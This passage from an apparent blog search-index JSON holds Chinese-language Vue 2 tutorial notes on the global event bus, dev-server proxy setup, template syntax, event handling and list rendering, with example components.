&#125;;&lt;/script&gt;&lt;style scoped&gt;.school &#123;background-color: skyblue;padding: 5px;&#125;&lt;/style&gt;\n\nsrc/components/Student.vue\n&lt;template&gt;  &lt;div class=&quot;student&quot;&gt;    &lt;h2&gt;学生姓名：&#123;&#123; name &#125;&#125;&lt;/h2&gt;    &lt;h2&gt;学生性别：&#123;&#123; sex &#125;&#125;&lt;/h2&gt;    &lt;button @click=&quot;sendStudentName&quot;&gt;把学生名给School组件&lt;/button&gt; //🔴  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name:&#x27;Student&#x27;,    data() &#123;      return &#123;        name:&#x27;张三&#x27;,        sex:&#x27;男&#x27;      &#125;    &#125;,    methods: &#123;  //🔴      sendStudentName()&#123;        this.$bus.$emit(&#x27;demo&#x27;, this.name)      &#125;    &#125;  &#125;&lt;/script&gt;&lt;style scoped&gt;.student&#123;background-color: pink;padding: 5px;margin-top: 30px;&#125;&lt;/style&gt;\n\n\n使用全局事件总线优化Todo-List案例\n并非所有通信都需要改成全局事件总线：\n父传子直接用props；子传父用props、$emit自定义事件；\n兄弟之间通信、或者跨级通信用全局事件总线\n\n此案例中，MyItem和App之间适用全局事件总线\nsrc/main.js\nimport Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;Vue.config.productionTip = falsenew Vue(&#123;  el:&#x27;#app&#x27;,  render: h =&gt; h(App),  beforeCreate() &#123;    Vue.prototype.$bus = this // 安装全局事件总线  &#125;&#125;)\n\nsrc/App.vue 删除给MyItem绑定的事件，利用this.$bus.$on给总线bus绑定事件\n&lt;template&gt;  &lt;div id=&quot;root&quot;&gt;\t\t&lt;div class=&quot;todo-container&quot;&gt;\t\t\t&lt;div class=&quot;todo-wrap&quot;&gt;\t\t\t\t&lt;MyHeader @addTodo=&quot;addTodo&quot;/&gt;\t\t\t\t&lt;MyList :todos=&quot;todos&quot;/&gt;\t\t\t\t&lt;MyFooter :todos=&quot;todos&quot; @checkAllTodo=&quot;checkAllTodo&quot; @clearAllTodo=&quot;clearAllTodo&quot;/&gt;\t\t\t&lt;/div&gt;\t\t&lt;/div&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport MyHeader from &#x27;./components/MyHeader&#x27;\timport MyFooter from &#x27;./components/MyFooter&#x27;\timport MyList from &#x27;./components/MyList&#x27;\texport default &#123;\t\tname: &#x27;App&#x27;,\t\tcomponents: &#123;MyHeader,MyFooter,MyList&#125;,\t\tdata()&#123;\t\t\treturn&#123;\t\t\t\ttodos:[\t\t\t\t\t&#123;id:&#x27;0001&#x27;,title:&#x27;吃饭&#x27;,done:true&#125;,\t\t\t\t\t&#123;id:&#x27;0002&#x27;,title:&#x27;喝酒&#x27;,done:false&#125;,\t\t\t\t\t&#123;id:&#x27;0003&#x27;,title:&#x27;开车&#x27;,done:true&#125;,\t\t\t\t]\t\t\t&#125;\t\t&#125;,\t\tmethods:&#123;\t\t\t//添加一个todo\t\t\taddTodo(todoObj)&#123;\t\t\t\tthis.todos.unshift(todoObj)\t\t\t&#125;,\t\t\t//勾选or取消勾选一个todo\t\t\tcheckTodo(id)&#123;\t\t\t\tthis.todos.forEach((todo)=&gt;&#123;\t\t\t\t\tif(todo.id === id) todo.done = !todo.done\t\t\t\t&#125;)\t\t\t&#125;,\t\t\t//删除一个todo\t\t\tdeleteTodo(id)&#123;\t\t\t\tthis.todos = this.todos.filter((todo) =&gt;&#123;\t\t\t\t\treturn todo.id !== id\t\t\t\t&#125;)\t\t\t&#125;,\t\t\t//全选or取消全选\t\t\tcheckAllTodo(done)&#123;\t\t\t\tthis.todos.forEach((todo)=&gt;&#123;\t\t\t\t\ttodo.done = done\t\t\t\t&#125;)\t\t\t&#125;,\t\t\t//清除所有已经完成的todo\t\t\tclearAllTodo()&#123;\t\t\t\tthis.todos = this.todos.filter((todo)=&gt;&#123;\t\t\t\t\treturn !todo.done\t\t\t\t&#125;)\t\t\t&#125;\t\t&#125;,\t\tmounted()&#123;\t\t\tthis.$bus.$on(&#x27;checkTodo&#x27;,this.checkTodo)\t\t\tthis.$bus.$on(&#x27;deleteTodo&#x27;,this.deleteTodo)\t\t&#125;,\t\tbeforeDestroy()&#123;\t\t\tthis.$bus.$off(&#x27;checkTodo&#x27;)\t\t\tthis.$bus.$off(&#x27;deleteTodo&#x27;)\t\t&#125;\t&#125;&lt;/script&gt;&lt;style&gt;  ……&lt;/style&gt;\n\nsrc/components/MyList.vue 删除给MyItem绑定的事件，删除props中接收的事件数据\nsrc/components/MyItem.vue 删除props中接收的事件数据，利用this.$bus.$emit触发事件\n&lt;template&gt;  &lt;li&gt;\t\t&lt;label&gt;\t\t\t&lt;input type=&quot;checkbox&quot; :checked=&quot;todo.done&quot; @change=&quot;handleCheck(todo.id)&quot;/&gt;\t\t\t&lt;!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，因为修改了props --&gt;\t\t\t&lt;!-- &lt;input type=&quot;checkbox&quot; v-model=&quot;todo.done&quot;/&gt; --&gt;\t\t\t&lt;span&gt;&#123;&#123;todo.title&#125;&#125;&lt;/span&gt;\t\t&lt;/label&gt;\t\t&lt;button class=&quot;btn btn-danger&quot; @click=&quot;handleDelete(todo.id)&quot;&gt;删除&lt;/button&gt;\t&lt;/li&gt;&lt;/template&gt;&lt;script&gt;export default &#123;    name:&#x27;MyItem&#x27;,\tprops:[&#x27;todo&#x27;],\tmethods:&#123;\t\t//勾选or取消勾选\t\thandleCheck(id)&#123;\t\t\t//通知App组件将对应的todo对象的done值取反\t\t\t// this.checkTodo(id)\t\t\tthis.$bus.$emit(&#x27;checkTodo&#x27;,id)\t\t&#125;,\t\t//删除\t\thandleDelete(id)&#123;\t\t\tif(confirm(&#x27;确定删除吗？&#x27;))&#123;\t\t\t\t//通知App组件将对应的todo对象删除\t\t\t\t// this.deleteTodo(id)\t\t\t\tthis.$bus.$emit(&#x27;deleteTodo&#x27;,id)\t\t\t&#125;\t\t&#125;\t&#125;,\tmounted()&#123;\t\t\t&#125;&#125;&lt;/script&gt;&lt;style&gt;    ……&lt;/style&gt;\n\n","categories":["Vue"],"tags":["Vue CLI","组件通信","全局事件总线"]},{"title":"Vue（二十四）：Vue脚手架之配置代理","url":"/2022/04/11/Vue%EF%BC%88%E4%BA%8C%E5%8D%81%E5%9B%9B%EF%BC%89%EF%BC%9AVue%E8%84%9A%E6%89%8B%E6%9E%B6%E4%B9%8B%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/","content":"Vue脚手架配置代理本案例需要下载axios库npm install axios\n配置参考文档 Vue-Cli devServer.proxy\nvue.config.js 是一个可选的配置文件，如果项目的 (和 package.json 同级的) 根目录中存在这个文件，那么它会被 @vue&#x2F;cli-service 自动加载。你也可以使用 package.json 中的 vue 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写\n\n方法一\n在vue.config.js中添加如下配置\nmodule.exports = &#123;  devServer:&#123;    proxy:&quot;http://localhost:5000&quot;  &#125;&#125;\n\n说明\n\n优点：配置简单，请求资源时直接发给前端（8080）即可\n缺点：不能配置多个代理，不能灵活的控制请求是否走代理\n工作方式：若按照上述配置代理，当请求了前端不存在的资源时，才会将请求会转发给服务器 （优先匹配前端资源）\n\n\n\n\n方法二\n编写vue.config.js配置具体代理规则\nmodule.exports = &#123;\tdevServer: &#123;      proxy: &#123;      &#x27;/api1&#x27;: &#123;\t\t\t\t\t\t\t\t\t\t\t\t\t// 匹配所有以 &#x27;/api1&#x27;开头的请求路径        target: &#x27;http://localhost:5000&#x27;,\t// 代理目标的基础路径        pathRewrite: &#123;&#x27;^/api1&#x27;:&#x27;&#x27;&#125;,\t\t\t\t// 代理往后端服务器的请求去掉 /api1 前缀        ws: true,\t\t\t\t\t\t\t\t\t\t\t\t\t// WebSocket        changeOrigin: true,              &#125;,      &#x27;/api2&#x27;: &#123;        target: &#x27;http://localhost:5001&#x27;,        pathRewrite: &#123;&#x27;^/api2&#x27;: &#x27;&#x27;&#125;,        changeOrigin: true      &#125;    &#125;  &#125;&#125;/*   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000（撒谎）跨域   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080（不撒谎）不跨域   changeOrigin默认值为true*/\n\n说明\n\n优点：可以配置多个代理，且可以灵活的控制请求是否走代理\n缺点：配置略微繁琐，请求资源时必须加前缀\n\n\n代码示例：\nvue.config.js\nmodule.exports = &#123;    pages: &#123;        index: &#123;            entry: &#x27;src/main.js&#x27;,        &#125;,    &#125;,    lintOnSave:false,    // 开启代理服务器（方式一）    // devServer: &#123;    //     proxy:&#x27;http://localhost:5000&#x27;    // &#125;    //开启代理服务器（方式二）\tdevServer: &#123;        proxy: &#123;            &#x27;/api1&#x27;: &#123;                target: &#x27;http://localhost:5000&#x27;,                pathRewrite:&#123;&#x27;^/api1&#x27;:&#x27;&#x27;&#125;,                // ws: true, //用于支持websocket,默认值为true                // changeOrigin: true //用于控制请求头中的host值,默认值为true            &#125;,            &#x27;/api2&#x27;: &#123;                target: &#x27;http://localhost:5001&#x27;,                pathRewrite:&#123;&#x27;^/api2&#x27;:&#x27;&#x27;&#125;,            &#125;        &#125;    &#125;&#125;\n\nsrc/App.vue\n&lt;template&gt;\t&lt;div&gt;\t\t&lt;button @click=&quot;getStudents&quot;&gt;获取学生信息&lt;/button&gt;\t\t&lt;button @click=&quot;getCars&quot;&gt;获取汽车信息&lt;/button&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport axios from &#x27;axios&#x27;\texport default &#123;\t\tname:&#x27;App&#x27;,\t\tmethods: &#123;\t\t\tgetStudents() &#123;\t\t\t\taxios.get(&#x27;http://localhost:8080/students&#x27;).then(\t\t\t\t\tresponse =&gt; &#123;\t\t\t\t\t\tconsole.log(&#x27;请求成功了&#x27;,response.data)\t\t\t\t\t&#125;,\t\t\t\t\terror =&gt; &#123;\t\t\t\t\t\tconsole.log(&#x27;请求失败了&#x27;,error.message)\t\t\t\t\t&#125;\t\t\t\t)\t\t\t&#125;,\t\t\tgetCars() &#123;\t\t\t\taxios.get(&#x27;http://localhost:8080/demo/cars&#x27;).then(\t\t\t\t\tresponse =&gt; &#123;\t\t\t\t\t\tconsole.log(&#x27;请求成功了&#x27;,response.data)\t\t\t\t\t&#125;,\t\t\t\t\terror =&gt; &#123;\t\t\t\t\t\tconsole.log(&#x27;请求失败了&#x27;,error.message)\t\t\t\t\t&#125;\t\t\t\t)\t\t\t&#125;\t\t&#125;,\t&#125;&lt;/script&gt;\n\n\n\n\n","categories":["Vue"],"tags":["Vue CLI","配置代理"]},{"title":"Vue（二）：模板语法与数据绑定","url":"/2022/04/01/Vue%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/","content":"模板语法插值语法\n功能：用于解析标签体内容\n写法：，xxx 是 js 表达式，可以直接读取到 data 中的所有区域\n\n指令语法\n功能：用于解析标签（包括：标签属性、标签体内容、绑定事件…）\n举例：&lt;a v-bind:href=&quot;xxx&quot;&gt;或简写为&lt;a :href=&quot;xxx&quot;&gt;，xxx 同样要写 js 表达式，可以直接读取到 data 中的所有属性\n备注：Vue中有很多的指令，且形式都是 v-xxx，此处只是拿v-bind举例\n\n&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot; /&gt;    &lt;title&gt;模板语法&lt;/title&gt;    &lt;!-- 引入Vue --&gt;    &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div id=&quot;root&quot;&gt;      &lt;h2&gt;插值语法&lt;/h2&gt;      &lt;h4&gt;你好，&#123;&#123; name &#125;&#125;&lt;/h4&gt;      &lt;hr /&gt;      &lt;h2&gt;指令语法&lt;/h2&gt;      &lt;a v-bind:href=&quot;tencent.url.toUpperCase()&quot; x=&quot;hello&quot;&gt;点我去看&#123;&#123; tencent.name &#125;&#125;1&lt;/a&gt;      &lt;a :href=&quot;tencent.url&quot; x=&quot;hello&quot;&gt;点我去看&#123;&#123; tencent.name &#125;&#125;2&lt;/a&gt;    &lt;/div&gt;  &lt;/body&gt;  &lt;script type=&quot;text/javascript&quot;&gt;    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。    new Vue(&#123;      el: &#x27;#root&#x27;,      data: &#123;        name: &#x27;jack&#x27;,        tencent: &#123;          name: &#x27;开端&#x27;,          url: &#x27;https://v.qq.com/x/cover/mzc00200mp8vo9b/n0041aa087e.html&#x27;,        &#125;      &#125;    &#125;)  &lt;/script&gt;&lt;/html&gt;\n\n数据绑定单向绑定\nv-bind数据只能从 data 流向页面\n\n双向绑定\nv-model数据不仅能从 data 流向页面，还可以从页面流向 data\n备注\n双向绑定一般都应用在表单类元素上，如 &lt;input&gt; &lt;select&gt; &lt;textarea&gt;等\nv-model:value可以简写为v-model，因为v-model默认收集的就是value值\n\n\n\n&lt;div id=&quot;root&quot;&gt;    &lt;!-- 普通写法 --&gt;    &lt;!-- 单向数据绑定：&lt;input type=&quot;text&quot; v-bind:value=&quot;name&quot;&gt;&lt;br/&gt; --&gt;    &lt;!-- 双向数据绑定：&lt;input type=&quot;text&quot; v-model:value=&quot;name&quot;&gt;&lt;br/&gt; --&gt;    &lt;!-- 简写 --&gt;    单向数据绑定：&lt;input type=&quot;text&quot; :value=&quot;name&quot;&gt;&lt;br/&gt;    双向数据绑定：&lt;input type=&quot;text&quot; v-model=&quot;name&quot;&gt;&lt;br/&gt;    &lt;!-- 如下代码是错误的，因为 v-model 只能应用在表单类元素（输入类元素）上 --&gt;    &lt;!-- &lt;h2 v-model:x=&quot;name&quot;&gt;你好啊&lt;/h2&gt; --&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;    Vue.config.productionTip = false // 阻止 vue 在启动时生成生产提示。    new Vue(&#123;        el: &#x27;#root&#x27;,        data: &#123;            name: &#x27;cess&#x27;        &#125;    &#125;)&lt;/script&gt;\n\n","categories":["Vue"],"tags":["模板语法","数据绑定"]},{"title":"Vue（五）：事件处理","url":"/2022/04/01/Vue%EF%BC%88%E4%BA%94%EF%BC%89%EF%BC%9A%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86/","content":"事件的基本用法\n使用v-on:xxx或@xxx绑定事件，其中 xxx 是事件名\n事件的回调需要配置在methods对象中，最终会在vm上\nmethods中配置的函数，不要用箭头函数，否则 this 就不是vm了\nmethods中配置的函数，都是被 Vue所管理的函数，this 的指向是vm 或 组件实例对象\n@click=&quot;demo&quot;和@click=&quot;demo($event)&quot;效果一致，但后者可以传参\n\n&lt;div id=&quot;root&quot;&gt;    &lt;h2&gt;欢迎来看&#123;&#123;name&#125;&#125;的笔记&lt;/h2&gt;    &lt;!-- &lt;button v-on:click=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt; --&gt;    &lt;button @click=&quot;showInfo1&quot;&gt;点我提示信息1（不传参）&lt;/button&gt;    &lt;button @click=&quot;showInfo2($event,66)&quot;&gt;点我提示信息2（传参）&lt;/button&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。    const vm = new Vue(&#123;        el: &#x27;#root&#x27;,        data: &#123;            name: &#x27;cess&#x27;,        &#125;,        methods: &#123;            showInfo1(event) &#123;                console.log(event.target.innerText)                // console.log(this) // 此处的this是vm                alert(&#x27;同学你好！&#x27;)            &#125;,            showInfo2(event, number) &#123;                console.log(event, number)                console.log(event.target.innerText)                // console.log(this) // 此处的this是vm                alert(&#x27;同学你好！！&#x27;)            &#125;        &#125;    &#125;)&lt;/script&gt;\n\n事件修饰符Vue中的事件修饰符\n\nprevent 阻止默认事件（常用）\nstop 阻止事件冒泡（常用）\nonce 事件只触发一次（常用）\ncapture 使用事件的捕获模式\nself 只有event.target是当前操作的元素时才触发事件\npassive 事件的默认行为立即执行，无需等待事件回调执行完毕\n修饰符可以连续写，比如可以这么用：@click.prevent.stop=&quot;showInfo&quot;\n\n&lt;div id=&quot;root&quot;&gt;    &lt;h2&gt;欢迎来到&#123;&#123; name &#125;&#125;学习&lt;/h2&gt;&lt;!-- 阻止默认事件（常用） --&gt;&lt;a href=&quot;http://www.atguigu.com&quot; @click.prevent=&quot;showInfo&quot;&gt;点我提示信息&lt;/a&gt;&lt;!-- 阻止事件冒泡（常用） --&gt;&lt;div class=&quot;demo1&quot; @click=&quot;showInfo&quot;&gt;    &lt;button @click.stop=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt;&lt;!-- 修饰符可以连续写 --&gt;&lt;!-- &lt;a href=&quot;http://www.qq.com&quot; @click.prevent.stop=&quot;showInfo&quot;&gt;点我提示&lt;/a&gt; --&gt;&lt;/div&gt;&lt;!-- 事件只触发一次（常用） --&gt;&lt;button @click.once=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt;&lt;!-- 使用事件的捕获模式： 在捕获阶段就触发，而不是在冒泡阶段触发--&gt;&lt;div class=&quot;box1&quot; @click.capture=&quot;showMsg(1)&quot;&gt;    div1    &lt;div class=&quot;box2&quot; @click=&quot;showMsg(2)&quot;&gt;        div2    &lt;/div&gt;&lt;/div&gt;&lt;!-- 只有event.target是当前操作的元素时才触发事件； --&gt;&lt;div class=&quot;demo1&quot; @click.self=&quot;showInfo&quot;&gt;    &lt;button @click=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt;&lt;/div&gt;    &lt;!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； --&gt;    &lt;!-- scroll是滚动条滚动，passive没有影响 --&gt;    &lt;!-- wheel是鼠标滚轮滚动，passive有影响 --&gt;    &lt;ul @wheel.passive=&quot;demo&quot; class=&quot;list&quot;&gt;        &lt;li&gt;1&lt;/li&gt;        &lt;li&gt;2&lt;/li&gt;        &lt;li&gt;3&lt;/li&gt;        &lt;li&gt;4&lt;/li&gt;    &lt;/ul&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;    Vue.config.productionTip = falsenew Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;        name: &#x27;尚硅谷&#x27;    &#125;,    methods: &#123;        showInfo(e) &#123;            alert(&#x27;同学你好！&#x27;)            // console.log(e.target)        &#125;,        showMsg(msg) &#123;            console.log(msg)        &#125;,        demo() &#123;            for (let i = 0; i &lt; 100000; i++) &#123;                console.log(&#x27;#&#x27;)            &#125;            console.log(&#x27;累坏了&#x27;)        &#125;    &#125;&#125;)&lt;/script&gt;\n\n键盘事件\n键盘上的每个按键都有自己的名称和编码，例如：Enter（13）。而Vue还对一些常用按键起了别名方便使用\n\n\nVue中常用的按键别名回车enter删除delete（捕获“删除”和“退格”键）退出esc空格space换行tab（特殊，必须配合keydown去使用）keydown.tab上up下down左left右right\nVue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（多单词小写短横线写法）\n系统修饰键（用法特殊）ctrl alt shift meta（meta就是win键）\n配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发指定 ctr+y 使用 @keyup.ctr.y\n配合keydown使用：正常触发事件\n\n\n也可以使用keyCode去指定具体的按键（不推荐）\nVue.config.keyCodes.自定义键名 &#x3D; 键码，可以去定制按键别名\n\n&lt;div id=&quot;root&quot;&gt;    &lt;h2&gt;欢迎打开&#123;&#123;name&#125;&#125;笔记&lt;/h2&gt;    &lt;input type=&quot;text&quot; placeholder=&quot;按下回车提示输入&quot; @keyup.enter=&quot;showInfo&quot;&gt;&lt;br/&gt;    &lt;input type=&quot;text&quot; placeholder=&quot;按下tab提示输入&quot; @keydown.tab=&quot;showInfo&quot;&gt;&lt;br/&gt;    &lt;input type=&quot;text&quot; placeholder=&quot;按下回车提示输入&quot; @keydown.huiche=&quot;showInfo&quot;&gt;&lt;br/&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;    Vue.config.productionTip = false\t// 阻止 vue 在启动时生成生产提示。    Vue.config.keyCodes.huiche = 13\t\t// 定义了一个别名按键    new Vue(&#123;        el: &#x27;#root&#x27;,        data: &#123;            name: &#x27;cess&#x27;        &#125;,        methods: &#123;            showInfo(e) &#123;                // console.log(e.key,e.keyCode)                console.log(e.target.value)            &#125;        &#125;,    &#125;)&lt;/script&gt;\n\n","categories":["Vue"],"tags":["事件处理"]},{"title":"Vue（八）：列表渲染","url":"/2022/04/01/Vue%EF%BC%88%E5%85%AB%EF%BC%89%EF%BC%9A%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/","content":"基本列表v-for指令\n用于展示列表数据\n语法：&lt;li v-for=&quot;(item,index) of items&quot; :key=&quot;index&quot;&gt;,这里key可以是index，更好的是遍历对象的唯一标识:key=&quot;item.id&quot;\n可遍历：数组、对象、字符串（用的少）、指定次数（用的少）\n\n&lt;title&gt;基本列表&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;!-- 遍历数组 --&gt;  &lt;h3&gt;人员列表（遍历数组）&lt;/h3&gt;  &lt;ul&gt;    &lt;li v-for=&quot;(p,index) of persons&quot; :key=&quot;index&quot;&gt;&#123;&#123; p.name &#125;&#125;-&#123;&#123; p.age &#125;&#125;&lt;/li&gt;  &lt;/ul&gt;  &lt;!-- 遍历对象 --&gt;  &lt;h3&gt;汽车信息（遍历对象）&lt;/h3&gt;  &lt;ul&gt;    &lt;li v-for=&quot;(value,k) of car&quot; :key=&quot;k&quot;&gt;&#123;&#123; k &#125;&#125;-&#123;&#123; value &#125;&#125;&lt;/li&gt;  &lt;/ul&gt;  &lt;!-- 遍历字符串 --&gt;  &lt;h3&gt;测试遍历字符串（用得少）&lt;/h3&gt;  &lt;ul&gt;    &lt;li v-for=&quot;(char,index) of str&quot; :key=&quot;index&quot;&gt;&#123;&#123; char &#125;&#125;-&#123;&#123; index &#125;&#125;&lt;/li&gt;  &lt;/ul&gt;  &lt;!-- 遍历指定次数 --&gt;  &lt;h3&gt;测试遍历指定次数（用得少）&lt;/h3&gt;  &lt;ul&gt;    &lt;li v-for=&quot;(number,index) of 5&quot; :key=&quot;index&quot;&gt;&#123;&#123; index &#125;&#125;-&#123;&#123; number &#125;&#125;&lt;/li&gt;  &lt;/ul&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      persons: [        &#123; id: &#x27;001&#x27;, name: &#x27;张三&#x27;, age: 18 &#125;,        &#123; id: &#x27;002&#x27;, name: &#x27;李四&#x27;, age: 19 &#125;,        &#123; id: &#x27;003&#x27;, name: &#x27;王五&#x27;, age: 20 &#125;      ],      car: &#123;        name: &#x27;奥迪A8&#x27;,        price: &#x27;70万&#x27;,        color: &#x27;黑色&#x27;      &#125;,      str: &#x27;hello&#x27;    &#125;  &#125;)&lt;/script&gt;\n\n\nkey的作用与原理\n\n面试题：react、vue中的key有什么作用？（key的内部原理）\n虚拟DOM中key的作用：key是虚拟DOM中对象的标识，当数据发生变化时，Vue会根据新数据生成新的虚拟DOM，随后Vue进行新虚拟DOM与旧虚拟DOM的差异比较(diff算法），比较规则如下\n对比规则\n旧虚拟DOM中找到了与新虚拟DOM相同的key\n若虚拟DOM中内容没变, 直接使用之前的真实DOM\n若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM\n\n\n旧虚拟DOM中未找到与新虚拟DOM相同的key\n创建新的真实DOM，随后渲染到到页面\n\n\n\n\n用index作为key可能会引发的问题\n若对数据进行逆序添加、逆序删除等破坏顺序操作，会产生没有必要的真实DOM更新 &#x3D;&#x3D;&gt; 界面效果没问题，但效率低\n若结构中还包含输入类的DOM：会产生错误DOM更新 &#x3D;&#x3D;&gt; 界面有问题\n\n\n开发中如何选择key？\n最好使用每条数据的唯一标识作为key，比如 id、手机号、身份证号、学号等唯一值\n如果不存在对数据的逆序添加、逆序删除等破坏顺序的操作，仅用于渲染列表，使用index作为key是没有问题的\n\n\n\n&lt;div id=&quot;root&quot;&gt;  &lt;h2&gt;人员列表（遍历数组）&lt;/h2&gt;  &lt;button @click.once=&quot;add&quot;&gt;添加一个老刘&lt;/button&gt;  &lt;ul&gt;    &lt;li v-for=&quot;(p,index) of persons&quot; :key=&quot;index&quot;&gt;      &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;      &lt;input type=&quot;text&quot;&gt;    &lt;/li&gt;  &lt;/ul&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      persons: [        &#123; id: &#x27;001&#x27;, name: &#x27;张三&#x27;, age: 18 &#125;,        &#123; id: &#x27;002&#x27;, name: &#x27;李四&#x27;, age: 19 &#125;,        &#123; id: &#x27;003&#x27;, name: &#x27;王五&#x27;, age: 20 &#125;      ]    &#125;,    methods: &#123;      add() &#123;        const p = &#123; id: &#x27;004&#x27;, name: &#x27;老刘&#x27;, age: 40 &#125;        this.persons.unshift(p)      &#125;    &#125;,  &#125;)&lt;/script&gt;\n\n\n列表过滤&lt;title&gt;列表过滤&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;h2&gt;人员列表&lt;/h2&gt;  &lt;input type=&quot;text&quot; placeholder=&quot;请输入名字&quot; v-model=&quot;keyWord&quot;&gt;  &lt;ul&gt;    &lt;li v-for=&quot;(p,index) of filPersons&quot; :key=&quot;p.id&quot;&gt;      &#123;&#123; p.name &#125;&#125;-&#123;&#123; p.age &#125;&#125;-&#123;&#123; p.sex &#125;&#125;    &lt;/li&gt;  &lt;/ul&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  // 用 watch 实现  // #region   /* new Vue(&#123;\t\t\tel: &#x27;#root&#x27;,\t\t\tdata: &#123;\t\t\t\tkeyWord: &#x27;&#x27;,\t\t\t\tpersons: [\t\t\t\t\t&#123; id: &#x27;001&#x27;, name: &#x27;马冬梅&#x27;, age: 19, sex: &#x27;女&#x27; &#125;,\t\t\t\t\t&#123; id: &#x27;002&#x27;, name: &#x27;周冬雨&#x27;, age: 20, sex: &#x27;女&#x27; &#125;,\t\t\t\t\t&#123; id: &#x27;003&#x27;, name: &#x27;周杰伦&#x27;, age: 21, sex: &#x27;男&#x27; &#125;,\t\t\t\t\t&#123; id: &#x27;004&#x27;, name: &#x27;温兆伦&#x27;, age: 22, sex: &#x27;男&#x27; &#125;\t\t\t\t],\t\t\t\tfilPersons: []\t\t\t&#125;,\t\t\twatch: &#123;\t\t\t\tkeyWord: &#123;\t\t\t\t\timmediate: true,\t\t\t\t\thandler(val) &#123;\t\t\t\t\t\tthis.filPersons = this.persons.filter((p) =&gt; &#123;\t\t\t\t\t\t\treturn p.name.indexOf(val) !== -1\t\t\t\t\t\t&#125;)\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;) */  //#endregion  // 用 computed 实现  new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      keyWord: &#x27;&#x27;,      persons: [        &#123; id: &#x27;001&#x27;, name: &#x27;马冬梅&#x27;, age: 19, sex: &#x27;女&#x27; &#125;,        &#123; id: &#x27;002&#x27;, name: &#x27;周冬雨&#x27;, age: 20, sex: &#x27;女&#x27; &#125;,        &#123; id: &#x27;003&#x27;, name: &#x27;周杰伦&#x27;, age: 21, sex: &#x27;男&#x27; &#125;,        &#123; id: &#x27;004&#x27;, name: &#x27;温兆伦&#x27;, age: 22, sex: &#x27;男&#x27; &#125;      ]    &#125;,    computed: &#123;      filPersons() &#123;        return this.persons.filter((p) =&gt; &#123;          return p.name.indexOf(this.keyWord) !== -1        &#125;)      &#125;    &#125;  &#125;) &lt;/script&gt;\n\n\n列表排序&lt;title&gt;列表排序&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;h2&gt;人员列表&lt;/h2&gt;  &lt;input type=&quot;text&quot; placeholder=&quot;请输入名字&quot; v-model=&quot;keyWord&quot;&gt;  &lt;button @click=&quot;sortType = 2&quot;&gt;年龄升序&lt;/button&gt;  &lt;button @click=&quot;sortType = 1&quot;&gt;年龄降序&lt;/button&gt;  &lt;button @click=&quot;sortType = 0&quot;&gt;原顺序&lt;/button&gt;  &lt;ul&gt;    &lt;li v-for=&quot;(p,index) of filPersons&quot; :key=&quot;p.id&quot;&gt;      &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;      &lt;input type=&quot;text&quot;&gt;    &lt;/li&gt;  &lt;/ul&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      keyWord: &#x27;&#x27;,      sortType: 0, // 0原顺序 1降序 2升序      persons: [        &#123; id: &#x27;001&#x27;, name: &#x27;马冬梅&#x27;, age: 30, sex: &#x27;女&#x27; &#125;,        &#123; id: &#x27;002&#x27;, name: &#x27;周冬雨&#x27;, age: 31, sex: &#x27;女&#x27; &#125;,        &#123; id: &#x27;003&#x27;, name: &#x27;周杰伦&#x27;, age: 18, sex: &#x27;男&#x27; &#125;,        &#123; id: 